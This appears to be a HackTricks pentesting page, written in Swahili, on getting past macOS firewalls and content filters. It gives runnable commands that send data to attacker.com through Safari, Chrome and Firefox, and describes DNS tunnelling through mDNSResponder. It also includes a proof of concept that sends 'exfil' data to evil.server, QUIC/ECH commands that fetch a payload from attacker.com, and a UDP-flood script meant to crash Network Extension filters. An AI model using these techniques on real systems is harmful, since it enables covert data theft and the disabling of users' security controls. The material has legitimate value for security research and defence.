# Kupita Firewalls za macOS

{{#include ../../banners/hacktricks-training.md}}

## Mbinu zilizopatikana

Mbinu zifuatazo zilionekana kufanya kazi katika baadhi ya firewall apps za macOS.

### Kutumia vibaya majina ya whitelist

- Kwa mfano, kuita malware kwa majina ya macOS processes yanayojulikana kama **`launchd`**

### Synthetic Click

- Ikiwa firewall itaomba ruhusa kutoka kwa mtumiaji, ifanye malware **ibofye allow**

### **Tumia Apple signed binaries**

- Kama **`curl`**, lakini pia nyingine kama **`whois`**

### Apple domains zinazojulikana

Firewall inaweza kuruhusu connections kwenda kwenye Apple domains zinazojulikana kama **`apple.com`** au **`icloud.com`**. Pia iCloud inaweza kutumiwa kama C2.

### Generic Bypass

Baadhi ya mawazo ya kujaribu kupita firewalls

### Kagua traffic inayoruhusiwa

Kujua traffic inayoruhusiwa kutakusaidia kutambua domains ambazo huenda ziko kwenye whitelist au applications zinazoruhusiwa kuzifikia
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia Vibaya DNS

Kwenye macOS, process **haiongei** na DNS server yenyewe. Name resolution hupitishwa kupitia **XPC** na **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), system daemon iliyosainiwa na Apple, hivyo kila lookup kwenye mashine huondoka kama traffic **kutoka kwa `mDNSResponder`** badala ya kutoka kwa process iliyoiomba. Kwa hiyo, firewalls huwa zinaiamini daemon hiyo bila masharti — kuizuia kungevunja name resolution kwa mfumo mzima.<sup>[[1]](#references)</sup>

Hilo linaifanya DNS kuwa channel inayobaki wazi hata firewall inapozuia sockets za malware yenyewe:<sup>[[1]](#references)</sup>

1. Malware inajaribu kuungana na `evil.com`. **Outbound connection** yake inakaguliwa na firewall na **inazuiwa**.
2. Badala yake, malware inaiomba `mDNSResponder` **iresolve** `evil.com`, kupitia XPC.
3. Firewall inakagua query inayotokana na ombi hilo, inamwona resolver huyo wa Apple aliyesainiwa kama mwanzilishi, na **inairuhusu**.
4. Query inafika kwenye DNS server — na ikiwa attacker anaendesha authoritative server ya `evil.com`, anadhibiti pande zote mbili za mawasiliano.

Kwa kuwa attacker anamiliki zone hiyo, hakuna "connection" inayohitajika: data hutolewa kwa siri ndani ya **queried labels** (kwa mfano, `<encoded-chunk>.evil.com`) na commands hurudi ndani ya **answer records** (TXT, A, CNAME…), ambao ni DNS tunnelling ya kawaida inayotumia process iliyo kwenye whitelist kikamilifu.

Process yoyote isiyo na privileged access inaweza kuendesha daemon hiyo moja kwa moja, jambo ambalo ni njia rahisi ya kuthibitisha kuwa path iko wazi:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Kupitia apps za Browser

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia process injections

Ikiwa unaweza **inject code ndani ya process** ambayo inaruhusiwa kuunganishwa na server yoyote, unaweza bypass ulinzi wa firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilities za hivi karibuni za macOS firewall bypass (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Mnamo Julai 2024 Apple ilirekebisha bug muhimu katika Safari/WebKit iliyovuruga “Web content filter” ya mfumo mzima inayotumiwa na parental controls za Screen Time.
URI iliyoundwa mahususi (kwa mfano, yenye “://” iliyowekwa URL-encode mara mbili) haitambuliwi na ACL ya Screen Time lakini inakubaliwa na WebKit, hivyo request hutumwa bila kuchujwa. Kwa hiyo, process yoyote inayoweza kufungua URL (ikiwemo code iliyo sandboxed au unsigned) inaweza kufikia domains ambazo zimezuiwa wazi na user au MDM profile.<sup>[[2]](#references)</sup>

Practical test (system isiyokuwa na patch):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug ya mpangilio wa rules za Packet Filter (PF) katika macOS 14 “Sonoma” za awali
Wakati wa mzunguko wa beta wa macOS 14, Apple ilianzisha regression katika userspace wrapper inayozunguka **`pfctl`**.  
Rules zilizoongezwa kwa keyword ya `quick` (inayotumiwa na VPN kill-switches nyingi) zilipuuzwa kimya kimya, na kusababisha traffic leak hata wakati VPN/firewall GUI iliripoti *blocked*. Bug hii ilithibitishwa na wauzaji kadhaa wa VPN na kurekebishwa katika RC 2 (build 23A344).<sup>[[6]](#references)</sup>

Ukaguzi wa haraka wa leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Kutumia vibaya huduma za helper zilizotiwa saini na Apple (legacy – pre-macOS 11.2)
Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu takriban binary 50 za Apple kama **`nsurlsessiond`** na App Store kupita firewalls zote za socket-filter zilizotekelezwa kwa kutumia Network Extension framework (LuLu, Little Snitch, n.k.).
Malware ingeweza kuanzisha mchakato ulioondolewa kwenye orodha—au kuingiza code ndani yake—na kupitisha traffic yake kupitia socket iliyokuwa tayari imeruhusiwa. Apple iliondoa kabisa exclusion list katika macOS 11.2, lakini technique hii bado ni muhimu kwenye mifumo ambayo haiwezi kufanyiwa upgrade.<sup>[[3]](#references)</sup>

Mfano wa proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH kukwepa Network Extension domain filters (macOS 12+)
NEFilter Packet/Data Providers hutegemea TLS ClientHello SNI/ALPN. Kwa **HTTP/3 over QUIC (UDP/443)** na **Encrypted Client Hello (ECH)**, SNI hubaki ikiwa imesimbwa kwa njia fiche, NetExt haiwezi kuchanganua mtiririko, na sheria za hostname mara nyingi hushindwa kwa hali ya fail-open, hivyo kuruhusu malware kufikia domains zilizozuiwa bila kugusa DNS.<sup>[[5]](#references)</sup>

PoC ndogo:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ikiwa QUIC/ECH bado imewezeshwa, hii ni njia rahisi ya kukwepa hostname-filter.

### Kukosekana kwa uthabiti kwa macOS 15 “Sequoia” Network Extension (2024–2025)
Build za awali za 15.0/15.1 husababisha third-party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, n.k.) ku-crash. Filter inapo-restart, macOS huondoa flow rules zake na bidhaa nyingi hushindwa kwa hali ya fail-open. Kufurika filter kwa maelfu ya UDP flows fupi (au kulazimisha QUIC/ECH) kunaweza kusababisha crash hiyo mara kwa mara na kuacha muda wa C2/exfil, huku GUI bado ikidai kuwa firewall inaendelea kufanya kazi.<sup>[[4]](#references)</sup>

Uzalishaji wa haraka (kwenye lab box salama):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Vidokezo vya tooling kwa macOS ya kisasa

1. Kagua sheria za sasa za PF zinazozalishwa na GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Orodhesha binaries ambazo tayari zina entitlement ya *outgoing-network* (ni muhimu kwa piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Sajili programmatically content filter yako ya Network Extension katika Objective-C/Swift.
Rootless PoC ndogo inayotuma packets kwenye local socket inapatikana katika source code ya **LuLu** ya Patrick Wardle.

## Marejeleo

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [macOS 14 Sonoma firewall bug fixed! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
